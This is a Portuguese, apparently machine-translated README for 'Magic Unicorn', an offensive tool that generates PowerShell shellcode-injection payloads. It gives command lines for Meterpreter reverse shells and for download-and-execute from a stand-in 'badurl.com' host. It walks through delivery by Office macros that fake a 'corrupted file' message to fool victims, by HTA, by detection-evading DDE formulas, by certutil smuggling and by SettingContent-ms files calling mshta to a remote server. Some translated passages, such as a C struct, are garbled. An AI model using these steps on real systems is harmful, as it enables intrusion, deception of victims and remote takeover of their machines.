unicórnio
=======

Escrito por: Dave Kennedy (@HackingDave)
Site: https://www.trustedsec.com

Magic Unicorn é uma ferramenta simples para usar um ataque de downgrade do PowerShell e injetar shellcode diretamente na memória. Baseado nos ataques powershell de Matthew Graeber e na técnica de bypass powershell apresentada por David Kennedy (TrustedSec) e Josh Kelly na Defcon 18.

O uso é simples, basta executar o Magic Unicorn (certifique-se de que o Metasploit esteja instalado se estiver usando métodos Metasploit e no caminho certo) e o magic unicorn gerará automaticamente um comando powershell que você precisa simplesmente recortar e colar o código powershell em uma janela de linha de comando ou através um sistema de entrega de carga útil. O Unicorn suporta seu próprio shellcode, ataque de cobalto e Metasploit.

root@rel1k:~/Desktop# python unicorn.py 

                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:


aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=

                
-------------------- Magic Unicorn Attack Vector -----------------------------

Native x86 powershell injection attacks on any Windows platform.
Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
Twitter: @TrustedSec, @HackingDave
Credits: Matthew Graeber, Justin Elze, Chris Gates

Happy Magic Unicorns.

Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro
Macro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro
HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta
HTA Example Shellcode: python unicorn.py <path_to_shellcode.txt>: shellcode hta
DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
Custom PS1 Example: python unicorn.py <path to ps1 file>
Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)
Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00)
Help Menu: python unicorn.py --help
```

###              -----INSTRUÇÕES DE ATAQUE DO POWERSHELL----

Tudo agora é gerado em dois arquivos, powershell_attack.txt e unicorn.rc. O arquivo de texto contém todo o código necessário para injetar o ataque powershell na memória. Observe que você precisará de um local que suporte algum tipo de injeção de comando remoto. Muitas vezes, isso pode ser feito por meio de um documento do Excel/Word ou por meio de psexec_commands dentro do Metasploit, SQLi, etc. Existem muitas implicações e cenários para onde você pode usar esse ataque. Basta colar o comando powershell_attack.txt em qualquer janela do prompt de comando ou onde você puder chamar o executável do powershell e ele retornará um shell para você. Este ataque também oferece suporte a windows/download_exec para um método de carga útil em vez de apenas cargas úteis do Meterpreter. Ao usar o download e o exec, basta colocar python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe e o código do powershell fará o download da carga útil e executará.

Observe que você precisará ter um ouvinte habilitado para capturar o ataque.

### -----INSTRUÇÕES DE ATAQUE DE MACRO----

Para o ataque de macro, você precisará ir para Arquivo, Propriedades, Faixas e selecionar Desenvolvedor. Assim que você fizer
isso, você terá uma guia de desenvolvedor. Crie uma nova macro, chame-a de Auto_Open e cole o código gerado
nisso. Isso será executado automaticamente. Observe que uma mensagem solicitará ao usuário dizendo que o arquivo
está corrompido e fecha automaticamente o documento Excel. ESSE É UM COMPORTAMENTO NORMAL! Isso está enganando o
vítima de pensar que o documento do Excel está corrompido. Você deve obter um shell por meio de injeção de powershell
depois disso.

Se você estiver implantando isso nas versões Office365/2016+ do Word, precisará modificar a primeira linha de
a saída de: Sub Auto_Open()
 
Para: Sub AutoOpen()
 
O nome da própria macro também deve ser "AutoOpen" em vez do esquema de nomenclatura herdado "Auto_Open".

OBS: AO COPIAR E COLAR O EXCEL, SE TIVER ESPAÇOS ADICIONAIS ADICIONADOS, VOCÊ PRECISA
REMOVA-OS DEPOIS DE CADA UMA DAS SEÇÕES DO CÓDIGO POWERSHELL NA VARIÁVEL "x" OU UM ERRO DE SINTAXE IRÁ
ACONTECER!

### -----INSTRUÇÕES DE ATAQUE HTA----

O ataque HTA gerará automaticamente dois arquivos, o primeiro o index.html que diz ao navegador para
use Launcher.hta que contém o código de injeção de powershell malicioso. Todos os arquivos são exportados para o
hta_access/ pasta e haverá três arquivos principais. O primeiro é index.html, o segundo Launcher.hta e o
por último, o arquivo unicorn.rc. Você pode executar msfconsole -r unicorn.rc para iniciar o ouvinte do Metasploit.

Um usuário deve clicar em permitir e aceitar ao usar o ataque HTA para que a injeção de powershell funcione
devidamente.

### -----Instrução de Ataque CERTUTIL----

O vetor de ataque certutil foi identificado por Matthew Graeber (@mattifestation) que permite que você tome
um arquivo binário, mova-o para um formato base64 e use certutil na máquina da vítima para convertê-lo de volta para
um binário para você. Isso deve funcionar em praticamente qualquer sistema e permitir que você transfira um binário para a vítima
máquina através de um arquivo de certificado falso. Para usar este ataque, basta colocar um executável no caminho do
unicorn e execute python unicorn.py <exe_name> crt para obter a saída base64. Assim que terminar,
vá para a pasta decode_attack/ que contém os arquivos. O arquivo bat é um comando que pode ser executado em um
máquina Windows para convertê-lo de volta em um binário.


### -----Instruções de ataque PS1 personalizadas ----

Esse método de ataque permite converter qualquer arquivo do PowerShell (.ps1) em um comando ou macro codificado.

Observe que, ao escolher a opção de macro, um arquivo ps1 grande pode exceder a quantidade de retornos de carro permitidos pelo
VBA. Você pode alterar o número de caracteres em cada string VBA passando um inteiro como parâmetro.

Exemplos:

    python unicorn.py harmless.ps1
    python unicorn.py myfile.ps1 macro
    python unicorn.py muahahaha.ps1 macro 500

O último usará uma string de 500 caracteres em vez do padrão 380, resultando em menos retornos de carro no VBA.




### -----Instruções de ataque DDE Office COM ----

Este vetor de ataque irá gerar a fórmula DDEAUTO para colocar no Word ou Excel. O objeto COM
DDEInitilize e DDEExecute permitem que fórmulas sejam criadas diretamente no Office, o que faz com que o
capacidade de obter execução remota de código sem a necessidade de macros. Este ataque foi documentado e completo
instruções podem ser encontradas em:

https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

Para usar este ataque, execute os seguintes exemplos:

    python unicorn.py <payload> <lhost> <lport> dde
    python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde

Uma vez gerado, a powershell_attack.txt será gerado que contém o código do Office e o
unicorn.rc arquivo que é o componente ouvinte que pode ser chamado por msfconsole -r unicorn.rc para
lidar com o ouvinte para a carga útil. além disso um download.ps1 também serão exportados (explicado
na última seção).

Para aplicar o payload, como exemplo (do artigo do sensepost):

1. Open Word
2. Insert tab -> Quick Parts -> Field
3. Choose = (Formula) and click ok.
4. Once the field is inserted, you should now see "!Unexpected End of Formula"
5. Right-click the Field, choose "Toggle Field Codes"
6. Paste in the code from Unicorn
7. Save the Word document.

Depois que o documento do Office for aberto, você deverá receber um shell por meio da injeção de powershell. Observação
esse DDE é limitado no tamanho do caractere e precisamos usar Invoke-Expression (IEX) como o método de download.

O ataque DDE tentará baixar download.ps1, que é nosso ataque de injeção de powershell desde
estamos limitados a restrições de tamanho. Você precisará mover o download.ps1 para um local que seja
acessível pela máquina da vítima. Isso significa que você precisa hospedar o download.ps1 em um Apache2
diretório ao qual ele tem acesso.

Você pode notar que alguns dos comandos usam "{ QUOTE" estas são formas de mascarar comandos específicos
que está documentado aqui: http://staaldraad.github.io/2017/10/23/msword-field-codes/. Nesse caso
estamos mudando WindowsPowerShell, powershell.exe, and IEX to evitar a detecção. Confira também a URL
pois tem alguns ótimos métodos para não chamar o DDE.

###               -----Farol de Cobalto de Importação ----

Este método importará o shellcode direto do Cobalt Strike Beacon diretamente do Cobalt Strike.

No Cobalt Strike, exporte a exportação Cobalt Strike "CS" (C#) e salve-a em um arquivo. Por exemplo, ligue
o arquivo, cobalt_strike_file.cs.

O código de exportação será mais ou menos assim:

* length: 836 bytes */
byte[] buf = new byte[836] { 0xfc, etc

Em seguida, para uso:

    python unicorn.py cobalt_strike_file.cs cs

O argumento cs informa ao Unicorn que você deseja usar a funcionalidade Cobalt strike. O resto é Magia.

Em seguida, simplesmente copie o comando powershell para algo que você tenha a capacidade de execução de comando remoto.

OBSERVAÇÃO: O ARQUIVO DEVE SER EXPORTADO NO FORMATO C# (CS) DENTRO DO COBALT STRIKE PARA ANALISAR CORRETAMENTE.

Existem algumas ressalvas com este ataque. Observe que o tamanho da carga será um pouco mais de 14k+ em bytes
Tamanho. Isso significa que, de uma perspectiva de argumento de linha de comando, se você copiar e colar, atingirá o
Restrição de tamanho de 8191 caracteres (codificada em cmd.exe). Se você estiver iniciando diretamente do cmd.exe
isso é um problema, no entanto, se você estiver iniciando diretamente do PowerShell ou de outros aplicativos normais
isso não é problema.

Alguns exemplos aqui, wscript.shell e powershell usam USHORT - 65535 / 2 = 32767 limite de tamanho:

    typedef struct _UNICODE_STRING {
        USHORT Comprimento;
        USHORT MaximumLength;
        Tampão PWSTR;
    } UNICODE_STRING;

Para este ataque, se você estiver iniciando diretamente do powershell, VBSCript (WSCRIPT.SHELL), não há
questões.

### -----Método de geração de shellcode personalizado----

Este método permitirá que você insira seu próprio shellcode no ataque Unicorn. O código do PowerShell
aumentará o lado da pilha do powershell.exe (através do VirtualAlloc) e o injetará na memória.

Observe que, para que isso funcione, seu arquivo txt para o qual você aponta o Unicorn deve ser formatado no
seguinte formato ou não funcionará:

0x00,0x00,0x00 e assim por diante.

Observe também que há restrições de tamanho. O tamanho total do comprimento do comando PowerShell não pode exceder
o tamanho de 8191. Este é o limite máximo de tamanho de argumento de linha de comando no Windows.

Uso:

    python unicorn.py shellcode_formatted_properly.txt shellcode

Em seguida, simplesmente copie o comando powershell para algo que você tenha a capacidade de execução de comando remoto.

NOTA: O ARQUIVO DEVE SER CORRETAMENTE FORMATADO EM UM FORMATO TIPO 0x00,0x00,0x00 COM NADA ALÉM DE
SEU SHELLCODE NO ARQUIVO TXT.

Existem algumas ressalvas com este ataque. Observe que, se o tamanho da sua carga útil for grande por natureza, não
caber em cmd.exe. Isso significa que, de uma perspectiva de argumento de linha de comando, se você copiar e colar,
atingiu a restrição de tamanho de 8191 caracteres (codificada em cmd.exe). Se você estiver iniciando diretamente de
cmd.exe isso é um problema, no entanto, se você estiver iniciando diretamente do PowerShell ou outro
aplicações isso não é um problema.

Alguns exemplos aqui, wscript.shell e powershell usam USHORT - 65535 / 2 = 32767 limite de tamanho:
    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING;

Para este ataque, se você estiver iniciando diretamente do powershell, VBSCript (WSCRIPT.SHELL), não há
questões.

### -----Método de extensão SettingContent-ms----


Primeiro, se você ainda não teve a chance, acesse o incrível blog SpectreOps de Matt Nelson (enigma0x3):

https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39

Este método usa um tipo de arquivo específico chamado ".SettingContent-ms" que permite a capacidade de ambos
cargas diretas de navegadores (abrir + execução de comando), bem como tipo de extensão por meio de incorporação em
produtos de escritório. Este focará especificamente nas configurações do tipo de extensão para execução de comandos
dentro do vetor de ataque PowerShell do Unicorn.

Existem vários métodos compatíveis com esse vetor de ataque. Como há um tamanho de caractere limitado
com esse ataque, o método de implantação é um HTA.

Para uma compreensão detalhada sobre como armar este ataque, visite:

https://www.trustedsec.com/2018/06/weaponizing-settingcontent/

As etapas que você precisará executar para concluir este ataque são gerar seu arquivo .SettingContent-ms de
autônomo ou hta. O método HTA suporta Metasploit, Cobalt Strike e direct
ataques de shellcode.

Os quatro métodos abaixo sobre o uso:

HTA SettingContent-ms Metasploit: `python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms`  
HTA Example SettingContent-ms: `python unicorn.py <cobalt_strike_file.cs cs ms`  
HTA Example SettingContent-ms: `python unicorn.py <patth_to_shellcode.txt>: shellcode ms`  
Generate .SettingContent-ms: `python unicorn.py ms`

O primeiro é uma carga útil do Metasploit, o segundo é um Cobalt Strike, o terceiro é o seu próprio shellcode e o quarto
apenas um arquivo .SettingContent-ms em branco.

Quando tudo for gerado, ele exportará um arquivo chamado Standalone_NoASR.SettingContent-ms em
o diretório raiz padrão do Unicorn (se estiver usando a geração de arquivo independente) ou sob o hta_attack/
pasta. Você precisará editar o arquivo Standalone_NoASR.SettingContent-ms e substituir:

SUBSTITUA COISAS LEGAIS AQUI

Com:

mshta http://<apache_server_ip_or_dns_name/Launcher.hta.

Em seguida, mova o conteúdo do hta_attack para /var/www/html.

Assim que a vítima clicar no arquivo .SettingContent-ms, o mshta será chamado na máquina da vítima
em seguida, baixe o arquivo Unicorn HTA que possui os recursos de execução de código.

Agradecimentos especiais e elogios a Matt Nelson pela incrível pesquisa

Confira também: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/

Uso:

    python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
    python unicorn.py <cobalt_strike_file.cs cs ms
    python unicorn.py <patth_to_shellcode.txt>: shellcode ms
    python unicorn.py ms

